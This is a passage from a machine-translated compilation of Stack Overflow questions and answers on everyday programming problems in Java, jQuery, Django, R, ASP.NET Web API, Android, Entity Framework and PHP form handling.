Since you declared the `displayName()` method as static using the `static` access modifier , there is no need to create an object of the `Begin` class in order to invoke the `displayName()` method.

In general , this is how the `Username` class should be :

```
package usename;
import name.Begin;
public class Useaname {
    public static void main(String[] args){
       Begin.displayName();
    }
} 
```

Alternatively, you can invoke the `displayName()` using a class instance by creating an object of the `Begin` class, just like this:

```
package usename;
import name.Begin;
public Useaname {
    public static void main(String[] args){
       Begin b = new Begin();
       b.displayName();
    }
} 
```

# jquery - jQuery | 变量值作为字符串而不是调用另一个变量

> ID：11820588
> 
> 赞同：1
> 
> 时间：2012-08-05T22:26:47.697
> 
> 标签：jquery, string, variables

的HTML：

```
<div id="div1" name="divname">Something</div>
<div id="div2" name="divname">Something else</div>

<div id="output"></div> 
```

jQuery：

```
$('[name="divname"]').click( function (){ 

   var divnum = $(this).attr('id'); 
   var divout = 'out' + divnum;

   var outdiv1 = 'first div clicked';
   var outdiv2 = 'second div clicked';

   $('#output').html(divout);

}); 
```

单击 div1 后的所需结果：

```
<div id="output">first div clicked</div> 
```

实际结果：

```
<div id="output">outdiv1</div> 
```

请帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T22:33:38.547

你应该这样做：

```
$('[name="divname"]').click( function (){ 

  var divnum = $(this).attr('id'); 
  var out={div1:'first div clicked',div2:'second div clicked'}
  $('#output').html(out[divnum]);

}); 
```

那是因为如果你说...

```
var divout = 'out' + divnum; 
```

...`divout`是一个字符串。

但是您想访问名称是`divout`包含的字符串的变量。所以最简单的方法是创建一个对象，因为你可以像这样访问它的属性：

1.  对象属性
2.  obj['属性']

所以

*   如果您知道房产名称：

    `obj.property`或者`obj['property']`

*   如果您不知道它的名称，但您有一个`myvar`包含它的变量：

    `obj[myvar]`( `myvar = 'property'`)

**编辑**：无论如何，在那种情况下，我会使用它：

```
$('[name="divname"]').click( function (){ 

  var divnum = $(this).attr('id'); 
  $('#output').html((divnum=='div1'?'first':'second')+' div clicked');

}); 
```

它检查是否`divnum`是`'div1'`，如果是，结果是`'first div clicked'`。如果没有，`'second div clicked'`.

这样你就不需要任何对象，只需要一个条件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T22:33:28.667

你不会得到任何像这样好的命名变量。如果您的变量具有非常相似的名称 ( `var1`, `var2`, `var3`, ...)，您应该使用对象或数组来存储它们。

在这种情况下，请尝试使用对象来创建名称和值之间的映射：

```
var outdivs = {
  'div1': 'first div clicked',
  'div2': 'second div clicked'
};

$('[name="divname"]').click(function() {
   var divnum = $(this).attr('id');

   $('#output').text(outdivs[divnum]);
}); 
```

# django - 在 Django 中使用更新方法切换布尔字段的值

> ID：11820590
> 
> 赞同：2
> 
> 时间：2012-08-05T22:27:06.637
> 
> 标签：django, models

我有一个模型实例，上面有一个布尔字段。我想要实现的是将值从 True 切换为 False ，反之亦然。

当然，我可以写：

```
inst = Model.objects.get(id=1)
inst.boolean_field = not inst.boolean_field
inst.save() 
```

但是有 2 个查询：一个用于获取，另一个用于更新。

我只想切换值，但以下似乎不起作用：

```
Model.objects.filter(id=1).update(boolean_field=not F("boolean_field")) 
```

我很确定我做错了什么，或者这是不可能的。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-06T08:29:28.390

不幸的`F() object`是，django 还不支持否定 of 。

当你这样做时`not F('boolean_field')`，它被评估为`True`，所以更新操作总是保存`True`。例如

```
>>> F('boolean_field')
<django.db.models.expressions.F object at 0x36b7d50>
>>> not F('boolean_field')
True 
```

请参阅 django [17186 上的此错误 - 反转 F 表达式（否定）](https://code.djangoproject.com/ticket/17186)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2018-03-02T10:00:43.827

您可以`Case`改用：

```
from django.db.models import Case, Value, When

queryset.update(active=Case(
    When(active=True, then=Value(False)),
    When(active=False, then=Value(True)),
)) 
```

# r - 试图比较两个分布

> ID：11820591
> 
> 赞同：5
> 
> 时间：2012-08-05T22:27:07.700
> 
> 标签：r, statistics, finance

我在互联网上找到了这段代码，它将正态分布与不同的学生分布进行了比较：

```
x <- seq(-4, 4, length=100)
hx <- dnorm(x)

degf <- c(1, 3, 8, 30)
colors <- c("red", "blue", "darkgreen", "gold", "black")
labels <- c("df=1", "df=3", "df=8", "df=30", "normal")

plot(x, hx, type="l", lty=2, xlab="x value",
  ylab="Density", main="Comparison of t Distributions")

for (i in 1:4){
  lines(x, dt(x,degf[i]), lwd=2, col=colors[i])
} 
```

我想根据自己的情况进行调整，我想将我的数据与正态分布进行比较。这是我的数据：

```
library(quantmod)
getSymbols("^NDX",src="yahoo", from='1997-6-01', to='2012-6-01')
daily<- allReturns(NDX) [,c('daily')]
dailySerieTemporel<-ts(data=daily)
ss<-na.omit(dailySerieTemporel) 
```

目的是查看我的数据是否正常...有人可以帮我解决这个问题吗？非常感谢我真的很感激！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-05T23:38:19.977

如果您只关心知道您的数据是否正态分布，您可以应用 Jarque-Bera 测试。该测试表明，在 null 下，您的数据是正态分布的，请参阅[此处](http://en.wikipedia.org/wiki/Jarque%E2%80%93Bera_test)的详细信息。`jarque.bera.test`您可以使用函数执行此测试。

```
 library(tseries)
 jarque.bera.test(ss)

    Jarque Bera Test

data:  ss 
X-squared = 4100.781, df = 2, p-value < 2.2e-16 
```

显然，从结果中，您可以看到您的数据不是正态分布的，因为即使 1% 的空值也已被拒绝。

要查看为什么您的数据不是正态分布的，您可以查看描述性统计数据：

```
 library(fBasics)
 basicStats(ss)
                     ss
nobs        3776.000000
NAs            0.000000
Minimum       -0.105195
Maximum        0.187713
1\. Quartile   -0.009417
3\. Quartile    0.010220
Mean           0.000462
Median         0.001224
Sum            1.745798
SE Mean        0.000336
LCL Mean      -0.000197
UCL Mean       0.001122
Variance       0.000427
Stdev          0.020671
Skewness       0.322820
Kurtosis       5.060026 
```

从最后两行可以看出`ss`，峰度过大，偏度不为零。这是 Jarque-Bera 测试的基础。

但是，如果您有兴趣将数据的实际分布与具有与您的数据相同的均值和方差的正态分布随机变量进行比较，您可以首先使用内核从您的数据中估计经验密度函数，然后绘制它，最后您只需必须生成一个与您的数据具有相同均值和方差的正常随机变量，请执行以下操作：

```
 plot(density(ss, kernel='epanechnikov'))
 set.seed(125)
 lines(density(rnorm(length(ss), mean(ss), sd(ss)), kernel='epanechnikov'), col=2) 
```

![在此处输入图像描述](../Images/0e1ade4c8b809af5f47a09f297d8eb95.png)

以这种方式，您可以从另一个概率分布生成其他曲线。

@Alex Reynolds 建议的测试将帮助您，如果您有兴趣了解您的数据来自什么可能的分布。如果这是您的目标，您可以查看任何统计教科书中的任何优点测试。不过，如果只是想知道您的变量是否是正态分布的，那么 Jarque-Bera 测试就足够了。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-05T22:31:44.423

查看[QQ](http://en.wikipedia.org/wiki/Q-Q_plot)、[Shapiro-Wilk](http://en.wikipedia.org/wiki/Shapiro%E2%80%93Wilk_test)或[KS](http://en.wikipedia.org/wiki/Kolmogorov%E2%80%93Smirnov_test)测试，看看您的数据是否呈正态分布。

# asp.net-mvc - 使用 ASP.NET WebAPI 对 POST 请求进行 XML 架构验证

> ID：11820594
> 
> 赞同：5
> 
> 时间：2012-08-05T22:27:20.217
> 
> 标签：asp.net-mvc, xsd, asp.net-mvc-4, asp.net-web-api, xml-validation

我正在尝试找到一种解决方案来验证在 POST 请求中发送的 XML 数据是否满足给定的自定义 XML 模式。

如果我使用`XmlMediaTypeFormatter`随 ASP.NET Web API 提供的，我没有可用的模式验证，据我所知。例如：如果我有一个模型类型......

```
public class Order
{
    public string Code { get; set; }
    public int Quantity { get; set; }
} 
```

`ApiController`...以及...中的 POST 操作

```
public HttpResponseMessage Post(Order order)
{
    if (ModelState.IsValid)
    {
        // process order...
        // send 200 OK response for example
    }
    else
        // send 400 BadRequest response with ModelState errors in response body
} 
```

...我可以发布以下“错误”的 XML 数据，但仍会得到 200 OK 响应：

```
User-Agent: Fiddler
Host: localhost:45678
Content-Type: application/xml; charset=utf-8

<Order> <Code>12345</Nonsense> </Order>   // malformed XML 
```

或者：

```
<Order> <CustomerName>12345</CustomerName> </Order>    // invalid property 
```

或者：

```
<Customer> <Code>12345</Code> </Customer>    // invalid root 
```

或者：

```
"Hello World"    // no XML at all 
```

等等等等

我对请求进行验证的唯一一点是模型绑定：在请求示例 1、3 和 4 中，`order`传递到`Post`方法中的是`null`，在示例 2`order.Code`中`null`，我可以通过测试`order == null`或标记`Code`属性来使属性无效`[Required]`属性。我可以在响应中使用 400“BadRequest”Http 状态代码和响应正文中的验证消息将此验证结果发回。但是我不能确切地说出什么是错误的，也无法区分示例 1、3 和 4 中的错误 XML（没有`order`发布，这是我唯一能看到的） - 例如。

要求`Order`必须使用特定的自定义 XML 模式发布，例如`xmlns="http://test.org/OrderSchema.xsd"`，我想验证发布的 XML 是否对此模式有效，如果不是，则在响应中发回模式验证错误。为了实现这一点，我从一个自定义开始`MediaTypeFormatter`：

```
public class MyXmlMediaTypeFormatter : MediaTypeFormatter
{
    // constructor, CanReadType, CanWriteType, ...

    public override Task<object> ReadFromStreamAsync(Type type, Stream stream,
        HttpContentHeaders contentHeaders, IFormatterLogger formatterLogger)
    {
        var task = Task.Factory.StartNew(() =>
        {
            using (var streamReader = new StreamReader(stream))
            {
                XDocument document = XDocument.Load(streamReader);
                // TODO: exceptions must the catched here,
                // for example due to malformed XML
                XmlSchemaSet schemaSet = new XmlSchemaSet();
                schemaSet.Add(null, "OrderSchema.xsd");

                var msgs = new List<string>();
                document.Validate(schemaSet, (s, e) => msgs.Add(e.Message));
                // msgs contains now the list of XML schema validation errors
                // I want to send back in the response
                if (msgs.Count == 0)
                {
                    var order = ... // deserialize XML to order
                    return (object)order;
                }
                else
                    // WHAT NOW ?
            }
        });
        return task;
    }
} 
```

只要一切正确，这就是有效的。

但我不知道该怎么办`msgs.Count > 0`。如何将此验证结果列表“传输”到`Post`操作，或者如何创建包含这些 XML 模式验证消息的 Http 响应？

此外，我不确定自定义`MediaTypeFormatter`是否是此类 XML 模式验证的最佳扩展点，以及我的方法是否正确。定制`HttpMessageHandler`/可能`DelegatingHandler`是一个更好的地方吗？或者是否有一些开箱即用的更简单的东西？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-06T01:53:01.960

如果我这样做，我不会使用格式化程序。格式化程序的主要目标是将连线表示转换为 CLR 类型。在这里，您有一个 XML 文档，您想要根据一个完全不同的任务来验证模式。

我建议创建一个新的 MessageHandler 来进行验证。从 DelegatingHandler 派生，如果内容类型是`application/xml`将内容加载到 XDocument 并验证。如果失败，则抛出 HttpResponseException。

只需将您的 MessageHandler 添加到 Configuration.MessageHandlers 集合中即可。

使用派生的 XmlMediaTypeFormatter 的问题在于，您现在正在执行嵌入在 ObjectContent 代码中的某个点，并且干净地退出可能会很棘手。此外，使 XmlMediaTypeFormatter 变得更复杂可能不是一个好主意。

我尝试创建 MessageHandler。我实际上并没有尝试运行此代码，所以买家要小心。此外，如果您避免阻止调用者，任务内容会变得非常棘手。也许有人会为我清理该代码，无论如何它就在这里。

```
 public class SchemaValidationMessageHandler : DelegatingHandler {

        private XmlSchemaSet _schemaSet;
        public SchemaValidationMessageHandler() {

            _schemaSet = new XmlSchemaSet();
            _schemaSet.Add(null, "OrderSchema.xsd");
        }

        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken) {

            if (request.Content != null && request.Content.Headers.ContentType.MediaType == "application/xml")
            {
                var tcs = new TaskCompletionSource<HttpResponseMessage>();

                var task =  request.Content.LoadIntoBufferAsync()  // I think this is needed so XmlMediaTypeFormatter will still have access to the content
                    .ContinueWith(t => {
                                      request.Content.ReadAsStreamAsync()
                                          .ContinueWith(t2 => {
                                                            var doc = XDocument.Load(t2.Result);
                                                            var msgs = new List<string>();
                                                            doc.Validate(_schemaSet, (s, e) => msgs.Add(e.Message));
                                                            if (msgs.Count > 0) {
                                                                var responseContent = new StringContent(String.Join(Environment.NewLine, msgs.ToArray()));
                                                                 tcs.TrySetException(new HttpResponseException(
                                                                    new HttpResponseMessage(HttpStatusCode.BadRequest) {
                                                                        Content = responseContent
                                                                    }));
                                                            } else {
                                                                tcs.TrySetResult(base.SendAsync(request, cancellationToken).Result);
                                                            }
                                                        });

                                  });
                return tcs.Task;
            } else {
                return base.SendAsync(request, cancellationToken);
            }

        } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-06T10:43:57.720

通过反复试验，我找到了一个解决方案（对于`WHAT NOW ?`问题代码中的占位符）：

```
//...
else
{
    PostOrderErrors errors = new PostOrderErrors
    {
        XmlValidationErrors = msgs
    };
    HttpResponseMessage response = new HttpResponseMessage(
        HttpStatusCode.BadRequest);
    response.Content = new ObjectContent(typeof(PostOrderErrors), errors,
        GlobalConfiguration.Configuration.Formatters.XmlFormatter);
    throw new HttpResponseException(response);
} 
```

...使用这样的响应类：

```
public class PostOrderErrors
{
    public List<string> XmlValidationErrors { get; set; }
    //...
} 
```

这似乎有效，然后响应如下所示：

```
HTTP/1.1 400 Bad Request
Content-Type: application/xml; charset=utf-8 
```

```
<PostOrderErrors xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                 xmlns:xsd="http://www.w3.org/2001/XMLSchema">
    <XmlValidationErrors>
        <string>Some error text...</string>
        <string>Another error text...</string>
    </XmlValidationErrors>
</PostOrderErrors> 
```

# android - 参数ITEMS的非法修饰符；只允许final

> ID：11820595
> 
> 赞同：1
> 
> 时间：2012-08-05T22:27:21.020
> 
> 标签：android, list, listview

我是新来的。我正在尝试做一个消息列表，其中包含消息 1、消息 2 和消息 3 的内容。但下面的代码显示错误消息。

```
static final String[] ITEMS = new String[] { "message 1", "message 2", "message 3" }; 
```

错误信息：

```
Illegal modifier for parameter ITEMS; only final is permitted 
```

但是在“另一个项目”中，我正在做一个水果清单，使用下面的代码。

```
static final String[] FRUITS = new String[] { "Apple", "Banana", "Coconut" }; 
```

它工作得很好。两个代码看起来完全一样，所以我不知道问题出在哪里。

以下是消息列表的完整代码。

```
package net.eg.itemlist;

import android.os.Bundle;
import android.view.Menu;
import android.widget.ArrayAdapter;
import android.app.ListActivity;

public class Main extends ListActivity {

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    static final String[] ITEMS = new String[] { "message 1", "message 2", "message 3" };

    ArrayAdapter<String> adapter =
        new ArrayAdapter<String>(this, R.layout.main, R.id.textview_id, ITEMS);
    setListAdapter(adapter);            

}
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-05T22:34:16.757

您不能`static`在方法中使用。将声明移至类级别或删除`static`.

`static`意味着它是类本身的值，而不是类的实例。因此，如果您创建了 100 个类的实例，则如果您声明它`static`，则该变量只有一个共享实例，但如果您不声明它，则将有 100 个实例`static`。

在 Java 中，这种变量只允许在类级别使用。

附带说明：在 C++（不确定 C）中，您可以在具有相似语义的方法/函数中使用它：每次调用函数/方法时，该变量的内存都是相同的，并且初始化只会是在第一次通话时完成。但是您不能从函数/方法外部寻址内存，因此变量将是“函数/方法私有”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T22:44:49.667

`static`从ITEMS 字符串数组中删除声明。

或者，如果 ITEMS 数组被声明为类属性，则可以保留它。

# r - xts 子类子集方法

> ID：11820597
> 
> 赞同：4
> 
> 时间：2012-08-05T22:27:46.043
> 
> 标签：r, xts

我想请教关于 xts 子类的建议。我正在`xtsAttributes`为我的 xts 数字矩阵的每一列添加元数据信息。元数据包含一个字符串，其中包含每列的描述。

所以`ncol(myxtsobject) = length(metadata)`。我还向对象添加了一个新类，比如`myclass`. 现在我想编写方法`[.myclass`扩展`[.xts`函数，以便在子集 xts 矩阵时也相应地子集我的元数据。

例如：`d <- myobject[,c(2,3,23)]`将`d`在元数据属性中生成 3 列和适当的 3 个条目。

有人可以指导我如何在合理使用现有 xts 和矩阵子集函数的同时做到这一点吗？

更多细节......下面是我的对象的结构（只是一个简约的例子）：

```
# creating the object
n <- 10
ind <- Sys.time() + 1:n
col <- sin(seq(from=0, to=2*pi, length.out=n))
col2 <- cos(seq(from=0, to=2*pi, length.out=n))
d <- xts(x=cbind(col,col2), order.by=ind)
KEY1 <- paste("desc k1 -",1:ncol(d))
KEY2 <- paste("desc k2 -",1:ncol(d))
xtsAttributes(d) <- data.frame(KEY1,KEY2,stringsAsFactors=F)
d <- structure(d, class = c("dm", "xts", "zoo"))
# resulting structure
str(d) 
```

现在，有了这样一个对象，我想开发一组函数，允许子集与对象元数据 KEY1、KEY2 一致，所以如果我删除/选择第 2 列，我将从 KEY1 和 KEY2 中删除/选择相应的成员。

我目前正在使用这段代码，到目前为止它是有效的。重用 data.frame 和 xts 子集。这些 getMeta.dm(x) 和 is.dm(x) 是我的函数，功能很明显。

```
#:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
#: subset.dm
#:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
subset.dm <- function(x,i,j,...)  {
# get my metadata, returns data.frame
md <- getMeta.dm(x)
# metadata subset
md <- md[j,]
# xts subset
myclass <- class(x)
x <- as.xts(x)
x <- x[i,j,...]
# now again assembling md object
# TODO fu() for creating dm objects
xtsAttributes(x) <- md
class(x) <- myclass
if(is.dm(x)) return(x) else stop("result is not dm object")
}

`[.dm` <- subset.dm 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T21:28:55.233

您需要为处理列元数据属性的子类创建子集函数：

```
`[.dm` <- function(x, i, j, drop=FALSE, which.i=FALSE, ...) {
  # Include all args from [.xts (check by running args(xts:::`[.xts`))
  # Call the regular xts subsetting function
  res <- xts:::`[.xts`(x, i, j, drop, which.i, ...)
  cnx <- colnames(x)   # Get colnames from x
  ncn <- is.null(cnx)  # Check if there are no colnames
  if(ncn)              # If there are no colnames, add them
    colnames(x) <- sprintf("X%d",1:ncol(x))
  # Determine which columns are in the resulting object
  cols <- which(cnx %in% colnames(res))
  # Get the 'KEY' attributes from x
  xa <- xtsAttributes(x)
  # Replace the 'KEY' attributes with values from columns we keep
  xtsAttributes(res) <- list(KEY1=xa$KEY1[cols], KEY2=xa$KEY2[cols])
  if(ncn)              # Remove our colnames from res
    colnames(res) <- NULL
  res                  # return result
} 
```

现在我们已经定义了子类子集函数，让我们测试一下：

```
> str(d[,1])
An ‘xts’ object from 2012-08-07 16:08:47 to 2012-08-07 16:08:56 containing:
  Data: num [1:10, 1] 0 0.643 0.985 0.866 0.342 ...
 - attr(*, "dimnames")=List of 2
  ..$ : NULL
  ..$ : chr "col"
  Indexed by objects of class: [POSIXct,POSIXt] TZ: 
  xts Attributes:  
List of 4
 $ tclass: chr [1:2] "POSIXct" "POSIXt"
 $ tzone : chr ""
 $ KEY1  : chr "desc k1 - 1"
 $ KEY2  : chr "desc k2 - 1"
> str(d[,2])
An ‘xts’ object from 2012-08-07 16:08:47 to 2012-08-07 16:08:56 containing:
  Data: num [1:10, 1] 1 0.766 0.174 -0.5 -0.94 ...
 - attr(*, "dimnames")=List of 2
  ..$ : NULL
  ..$ : chr "col2"
  Indexed by objects of class: [POSIXct,POSIXt] TZ: 
  xts Attributes:  
List of 4
 $ tclass: chr [1:2] "POSIXct" "POSIXt"
 $ tzone : chr ""
 $ KEY1  : chr "desc k1 - 2"
 $ KEY2  : chr "desc k2 - 2" 
```

看起来不错。请注意，您可以继续使用 xts 样式的子集功能：

```
> str(d["2012-08-07 16:08:50",1])
An ‘xts’ object from 2012-08-07 16:08:50 to 2012-08-07 16:08:50 containing:
  Data: num [1, 1] 0.866
 - attr(*, "dimnames")=List of 2
  ..$ : NULL
  ..$ : chr "col"
  Indexed by objects of class: [POSIXct,POSIXt] TZ: 
  xts Attributes:  
List of 4
 $ tclass: chr [1:2] "POSIXct" "POSIXt"
 $ tzone : chr ""
 $ KEY1  : chr "desc k1 - 1"
 $ KEY2  : chr "desc k2 - 1"
> str(d["2012-08-07 16:08:50",2])
An ‘xts’ object from 2012-08-07 16:08:50 to 2012-08-07 16:08:50 containing:
  Data: num [1, 1] -0.5
 - attr(*, "dimnames")=List of 2
  ..$ : NULL
  ..$ : chr "col2"
  Indexed by objects of class: [POSIXct,POSIXt] TZ: 
  xts Attributes:  
List of 4
 $ tclass: chr [1:2] "POSIXct" "POSIXt"
 $ tzone : chr ""
 $ KEY1  : chr "desc k1 - 2"
 $ KEY2  : chr "desc k2 - 2" 
```

# c# - 使用 Entity Framework 调用存储过程时出现问题：需要未提供参数

> ID：11820603
> 
> 赞同：0
> 
> 时间：2012-08-05T22:29:10.317
> 
> 标签：c#, entity-framework

我有以下存储过程：

```
CREATEA PROCEDURE USP_U_Pricing 
(  
@ProductId int 
)  
AS  
BEGIN
....
END 
```

我像这样设置 DbParameter：

```
var pProductId = dataProvider.GetParameter(); //This returns a DbParameter
pProductId.ParameterName = "@ProductId";
pProductId.Value = productId;
pProductId.DbType = DbType.Int32; 
```

并像这样调用程序：

```
this.Database.SqlQuery<TEntity>("USP_U_Pricing", parameters).ToList(); 
```

其中，pricing 是 SP 名称，参数是一个仅包含 pProduct 对象的数组。它在那里，我检查了。

执行此行时，出现以下异常：

> 过程或函数“USP_U_Pricing”需要参数“@ProductId”，但未提供该参数。

我一直在阅读并测试设置参数的不同方法，但没有结果。如果我设置两个参数，一个称为 ProductId，另一个称为 @ProductId，我会收到一个错误，即参数名称应该是唯一的......

你能帮我吗？

编辑：参数是一个包含参数信息的数组。它被填充是因为我用这个签名调用了一个方法：

```
 ExecuteStoredProcedureList<TEntity>(string commandText, params object[] parameters) 
```

将 pProductId 作为参数传递：

```
dbContext.ExecuteStoredProcedureList<PricingInfo>(
                "USP_U_Pricing",
                pProductId); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-05T22:45:41.300

你能试试这个。

```
this.Database.SqlQuery<TEntity>("EXEC USP_U_Pricing @ProductId", pProductID); 
```

顺便说一句，在您的代码中，我看不到传递给 SqlQuery 的“参数”参数的创建。

# iphone - jQuery插件，类似iphone app页面滑动动画

> ID：11820604
> 
> 赞同：2
> 
> 时间：2012-08-05T22:29:13.547
> 
> 标签：iphone, html, css, animation, jquery-plugins

我正在寻找一个 jquery 插件，它使用类似于某些 iphone 应用程序的滑动动画导航到网站的其他页面。我尝试自己设计这个，但我无法让它工作。

**这是我需要的一个例子：**

（按下按钮时）

![p1](../Images/33806795c9f916f37bba4ad32c3859a1.png) ![p2](../Images/d9457fc87d388d92bb70e6f967bf72b9.png) ![在此处输入图像描述](../Images/87aecacec41a4b21224b7742605f6c28.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T23:33:24.000

你看过 JQuery Mobile 吗？它模仿了很多 iPhone 动画，并且可以在非移动浏览器和移动浏览器上运行。例如，[http://jquerymobile.com/demos/1.1.1/docs/pages/page-transitions.html](http://jquerymobile.com/demos/1.1.1/docs/pages/page-transitions.html)有一个可以演示的“幻灯片”过渡。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-10T22:35:05.633

您可以尝试煎茶触摸，从未亲自使用过，但似乎可以做您想做的事。

演示：[http ://dev.sencha.com/deploy/touch/examples/production/kitchensink/#menu/animations](http://dev.sencha.com/deploy/touch/examples/production/kitchensink/#menu/animations)

下载：[http ://www.sencha.com/products/touch/](http://www.sencha.com/products/touch/)

还有 JQtouch 一个快速的谷歌会发现（因为我不能发布链接，因为声誉低）

# java - 如何访问链表中的列表值？

> ID：11820607
> 
> 赞同：-4
> 
> 时间：2012-08-05T22:29:31.363
> 
> 标签：java, data-structures

我有一个链表，它存储一个类的对象，它有 4 个数据成员、2 个字符串、一个整数和另一个类的对象列表。

如何访问链接列表中列表的值？

好的，这就是我所拥有的

LogProcess lp=new LogProcess(revision,author,date,pathinfo,msg);

pathinfo 是 List.revision 格式的列表，作者、日期、msg 是字符串。

现在 PathInfo 是一个具有三个数据成员 action、kind、pathinfo 的类。所有 3 个都是字符串。

现在让我们说，如果我将链接列表传递给构造函数并想要访问 action、kind 和 pathinfo 的值，我该怎么办？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T22:32:09.457

假设你正在使用`LinkedList`你会调用`get`. 如果你不使用泛型（`LinkedList<YourFooObject> YourLinkedList;`会使用它们，`LinkedList YourLinkedList`不会），那么你需要一个演员，像这样

```
 YourFooObject foo = (YourFooObject)YourLinkedList.get(0) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T22:33:18.787

```
//Retriver one of the nodes of the linked list
YourObjectType node = yourLinkedList.get(int index)

//access the list instance variable of your object (depending on it visibility)
node.myList; //if accessible from here
MyList myList = node.getMyList(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-05T22:36:31.290

LinkedList的`get(index)`函数将返回所需索引处的元素。

```
YourStructure data = list.get(someindex); 
```

现在您可以从单个对象中获取列表：

```
LinkedList<Something> sublist = data.getList(); 
```

然后您可以像往常一样遍历该子列表：使用`for`循环、a`foreach`或 an `iterator`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-05T22:40:42.723

在我看来，解决这个问题的最好方法是使用对象数组/列表/集合的 foreach 循环，例如：

```
for(Object o : list) {
     if(o instanceof String) {
        //Object in list is a string
        String s = (String)o; //make sure to properly cast the object now that you know it is of proper type
     }
     else if(o instanceof int) {
        //object in list is an int
     }
     else if(o instanceof classA) {
        //object in list is from classA and you get the idea
     }
     else if(o instanceof classB) {
     }
//etc..
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-12-07T10:14:16.203

您可以为您创建一个迭代器`LinkedList`来访问`LinkedList`您的特定对象`class object`，这样的事情会起作用：

```
LinkedList<YourObject> list = new LinkedList<YourObject>();
ListIterator listIt = list.listIterator();
YourObject sample = listIt.next();//or any of the objects you need in your list
int valueOfSample = sample.getFirstParameter();//Assuming getFirstParameter is a method of your object class that returns the first integer parameter 
```

# php - 如何使用 html 表单提交多个数组复选框

> ID：11820608
> 
> 赞同：19
> 
> 时间：2012-08-05T22:30:19.707
> 
> 标签：php, html, forms

我正在尝试使用复选框表单提交多个数组，但目前我只能提交一个数组，这是我目前所拥有的

在这个例子中，我提交了一个带有数组的数字`delete[]`数组，这个数组得到了正确处理，我也想提交`condition[]`这个没有得到正确处理的数组，解决这个问题的最佳方法是什么？

**php代码**

```
$catalog = $database->getInventory();

if($catalog){   
   $numRows = sizeof($catalog);//count
   echo "<b>Book Count:</b> ".$numRows."<br>";

   echo "<form method='post' action='inventory.php'>";
   echo "<table id='example' class='tablesorter' border='0' cellpadding='0' cellspacing='1'>";
   echo "
      <thead>
         <tr>
           <th>ISBN</th>        
           <th>Title&nbsp;&nbsp;&nbsp;</th>
           <th>Rank&nbsp;&nbsp;</th>
           <th>Condition&nbsp;&nbsp;</th>   
           <th><input type='checkbox' name='delete' value='all' /></th>
         </tr>
      </thead>\n";

   foreach($catalog as $elem){
      echo "
         <tr>
            <td>".$elem["isbn"]."</td>
            <td>".$elem["title"]."</td>
            <td>".$elem["rank"]."</td>
            <td>".$elem["condition"]."</td>
            <td> 
               <input type='checkbox' name='add[]' 
                  value='".$elem['isbn']."_".$elem['condition']."_"."' />
            </td>
         </tr>";    
   }

   echo "</table>";
   echo "</form>";
} 
```

**示例 html 标记**

```
<form method='post' action='inventory.php'>
   <table>
      <tr>
         <td>
            <input type='hidden' name='addInventoryBook' value='1'>
            <input type='submit' value='Add' />
         </td>
      </tr>

      <tr>
         <td>
            <input type='checkbox' name='add[]' value='100001_used' />
         </td>
      </tr>

      <tr>
         <td>
            <input type='checkbox' name='add[]' value='100001_new' />
         </td>
      </tr>

      <tr>
         <td>
            <input type='checkbox' name='add[]' value='100003_new' />
         </td>
      </tr>

   </table>
</form> 
```

**php函数**

```
function Inventory(){   
   if(isset($_POST['addInventoryBook'])){
      if(isset($_POST['add']) && is_array($_POST['add'])){
     $arr = array();
         foreach($_POST['add'] as $checkbox){
            $temp = explode("_", $checkbox);

            $arr[] = array(
               "isbn"       => $temp[0],
               "condition"      => $temp[1],
               "sub_condition"  => $temp[2]
            );
         }              
     $this->addInventoryBook($arr); 
      }

      else{
         echo "No values have been set";
      }
 }

function addInventoryBook($arr){
   foreach($arr as $elem){
      //if used get sub-category
      if($elem['condition']=='used'){
         echo $elem['isbn']."-".ucfirst($elem['condition'])
            .ucfirst($elem['sub_condition'])."<br>";
      }

      else if($elem['condition']=='new'){
         echo $elem['isbn']."-".ucfirst($elem['condition'])."<br>";
      }

   }
} 
```

我想要的只是基本上能够将两个数组传递给我的 php 脚本

**电流输出**

```
100001
100002
100003 
```

**期望的输出**

```
100001   good
100002   new
100003   new 
```

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2012-08-05T22:45:16.910

我怀疑您遇到的问题是，只有选中的复选框才会被传递回服务器，而*所有*隐藏字段都将始终被传递，因此数组的长度会有所不同，并且键不会对应。

对此的解决方案实际上相对简单——您只需要指定`condition`数组的键，这样您就可以再次匹配这些值。像这样的东西：

HTML：

```
 <tr>
     <td>
        <input type='hidden' name='condition[100001]' value='good' />
        <input type='checkbox' name='delete[]' value='100001' />
     </td>
  </tr>

  <tr>
     <td>
        <input type='hidden' name='condition[100002]' value='new' />
        <input type='checkbox' name='delete[]' value='100002' />
     </td>
  </tr> 
```

PHP：

```
foreach ($_POST['delete'] as $delete) {
  $condition = $_POST['condition'][$delete];
  // Do stuff
} 
```

这会将数组中的值与`$_POST['condition']`数组联系起来，`$_POST['delete']`因此一切都会再次匹配。

**编辑**

上面创建密钥的方式不是很好，回想起来这是错误的方法。

为了演示*正确*的方法，让我们假设我们有以下数组，既漂亮又简单：

```
